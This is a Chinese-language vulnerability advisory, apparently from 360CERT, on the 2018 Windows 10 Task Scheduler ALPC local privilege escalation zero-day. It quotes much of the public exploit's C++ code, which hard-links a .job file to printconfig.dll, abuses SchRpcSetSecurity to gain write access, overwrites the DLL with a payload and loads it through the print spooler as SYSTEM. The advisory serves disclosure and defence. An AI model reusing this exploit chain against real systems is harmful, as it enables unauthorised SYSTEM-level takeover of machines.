> 原文链接: https://www.anquanke.com//post/id/158293 


# 漏洞预警 | Windows 10本地提权0day预警


                                阅读量   
                                **266017**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">3</a>
                                </b>
                                                                                    



[![](https://p4.ssl.qhimg.com/t014a95fa5d3bfafefb.jpg)](https://p4.ssl.qhimg.com/t014a95fa5d3bfafefb.jpg)

## 0x00 漏洞背景

win10中任务调度服务导出的函数没有验证调用者的权限，任意权限的用户调用该函数可以获取系统敏感文件的写权限，进而提权。



## 0x01 漏洞影响

漏洞影响win10和windows server 2016。目前发布的EXP暂时只能用于x64系统。



## 0x02 漏洞详情

win10系统Task Scheduler任务调度服务中ALPC调用接口导出了SchRpcSetSecurity函数，该函数能够对一个任务或者文件夹设置安全描述符。

```
HRESULT SchRpcSetSecurity(
   [in, string] const wchar_t* path,
   [in, string] const wchar_t* sddl,
   [in] DWORD flags
 );
```

该服务是通过svchost的服务组netsvcs所启动的，对应的dll是schedsvc.dll。

[![](https://p403.ssl.qhimgs4.com/t017b0987036d55e326.png)](https://p403.ssl.qhimgs4.com/t017b0987036d55e326.png)

[![](https://p403.ssl.qhimgs4.com/t018ae12ad1bdb01f38.png)](https://p403.ssl.qhimgs4.com/t018ae12ad1bdb01f38.png)

[![](https://p403.ssl.qhimgs4.com/t015deed4a3b2679771.png)](https://p403.ssl.qhimgs4.com/t015deed4a3b2679771.png)

在xp系统中，任务存放在C:\Windows\Tasks目录，后缀为.job；而win7及以后的版本任务以xml的格式存放在C:\Windows\System32\Tasks目录。

[![](https://p403.ssl.qhimgs4.com/t012463785a6b70df71.png)](https://p403.ssl.qhimgs4.com/t012463785a6b70df71.png)

可能是为了兼容的考虑，SchRpcSetSecurity函数在win10中仍然会检测C:\Windows\Tasks目录下是否存在后缀为.job的文件，如果存在则会写入DACL数据。如果将job文件硬链接到特定的dll那么特定的dll就会被写入DACL数据，本来普通用户对特定的dll只具有读权限，这样就具有了写权限，接下来向dll写入漏洞利用代码并启动相应的程序就获得了提权。

那么首先需要找到一个普通用户具有读权限而系统具有写入DACL权限的dll，EXP中用的是C:\Windows\System32\DriverStore\FileRepository\prnms003.inf_amd64_4592475aca2acf83\Amd64\printconfig.dll，然后将C:\Windows\Tasks\UpdateTask.job硬链接到这个dll。

```
WIN32_FIND_DATA FindFileData;
    HANDLE hFind;
    hFind = FindFirstFile(L"C:\\Windows\\System32\\DriverStore\\FileRepository\\prnms003.inf_amd64*", &amp;FindFileData);
    wchar_t BeginPath[MAX_PATH] = L"c:\\windows\\system32\\DriverStore\\FileRepository\\";
    wchar_t PrinterDriverFolder[MAX_PATH];
    wchar_t EndPath[23] = L"\\Amd64\\PrintConfig.dll";
    wmemcpy(PrinterDriverFolder, FindFileData.cFileName, wcslen(FindFileData.cFileName));
    FindClose(hFind);
    wcscat(BeginPath, PrinterDriverFolder);
    wcscat(BeginPath, EndPath);

    //Create a hardlink with UpdateTask.job to our target, this is the file the task scheduler will write the DACL of
    CreateNativeHardlink(L"c:\\windows\\tasks\\UpdateTask.job", BeginPath);
```

在调用SchRpcSetSecurity函数使普通用户成功获取了对该dll写入的权限之后写入资源文件中的exploit.dll。

```
//Must be name of final DLL.. might be better ways to grab the handle
    HMODULE mod = GetModuleHandle(L"ALPC-TaskSched-LPE");

    //Payload is included as a resource, you need to modify this resource accordingly.
    HRSRC myResource = ::FindResource(mod, MAKEINTRESOURCE(IDR_RCDATA1), RT_RCDATA);
    unsigned int myResourceSize = ::SizeofResource(mod, myResource);
    HGLOBAL myResourceData = ::LoadResource(mod, myResource);
    void* pMyBinaryData = ::LockResource(myResourceData);

    //We try to open the DLL in a loop, it could already be loaded somewhere.. if thats the case, it will throw a sharing violation and we should not continue
    HANDLE hFile;
    DWORD dwBytesWritten = 0;
    do `{`
        hFile = CreateFile(BeginPath,GENERIC_WRITE,0,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);                  
        WriteFile(hFile,(char*)pMyBinaryData,myResourceSize,&amp;dwBytesWritten,NULL);           
        if (hFile == INVALID_HANDLE_VALUE)
        `{`
            Sleep(5000);
        `}`
    `}` while (hFile == INVALID_HANDLE_VALUE);
    CloseHandle(hFile);
```

printconfig.dll和系统打印相关，并且没有被print spooler服务默认启动。所以随后调用StartXpsPrintJob开始一个XPS打印。

```
//After writing PrintConfig.dll we start an XpsPrintJob to load the dll into the print spooler service.
    CoInitialize(nullptr);
    IXpsOMObjectFactory *xpsFactory = NULL;
    CoCreateInstance(__uuidof(XpsOMObjectFactory), NULL, CLSCTX_INPROC_SERVER, __uuidof(IXpsOMObjectFactory), reinterpret_cast&lt;LPVOID*&gt;(&amp;xpsFactory));
    HANDLE completionEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
    IXpsPrintJob *job = NULL;
    IXpsPrintJobStream *jobStream = NULL;
    StartXpsPrintJob(L"Microsoft XPS Document Writer", L"Print Job 1", NULL, NULL, completionEvent, NULL, 0, &amp;job, &amp;jobStream, NULL);
    jobStream-&gt;Close();
    CoUninitialize();
    return 0;
```

整个漏洞利用程序编译出来是个dll，把它注入到notepad中运行，发现spoolsv.exe创建的notepad已经具有SYSTEM权限，而系统中的printconfig.dll也被修改成了资源文件中的exploit.dll。

[![](https://p403.ssl.qhimgs4.com/t01803853bace9f67ea.jpeg)](https://p403.ssl.qhimgs4.com/t01803853bace9f67ea.jpeg)

[![](https://p403.ssl.qhimgs4.com/t0141ce518b48e313e3.png)](https://p403.ssl.qhimgs4.com/t0141ce518b48e313e3.png)



## 0x03 防御措施

建议用户安装360安全卫士等终端防御软件拦截利用此类漏洞的攻击，不要打开来源不明的程序。



## 0x04 时间线

2018-08-27 漏洞详情公开披露

2018-08-29 360CERT发布漏洞预警



## 0x05 参考链接

1.[https://github.com/SandboxEscaper/randomrepo](https://github.com/SandboxEscaper/randomrepo)

2.[https://msdn.microsoft.com/en-us/library/cc248452.aspx](https://msdn.microsoft.com/en-us/library/cc248452.aspx)
